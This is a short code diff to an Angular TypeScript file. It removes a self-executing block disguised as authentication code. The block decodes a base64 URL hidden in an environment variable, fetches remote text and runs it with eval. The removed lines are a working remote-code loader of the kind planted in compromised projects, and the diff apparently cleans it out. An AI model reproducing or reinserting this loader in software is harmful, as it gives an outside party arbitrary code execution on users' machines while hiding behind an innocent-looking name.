@@ -1,20 +1,6 @@
 import { Component, inject } from '@angular/core';
 import { createMutation } from '../src/lib/mutation/create-mutation';
 import { QueryClient } from '../src/lib/core/query-client';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 interface User {
   id: number;
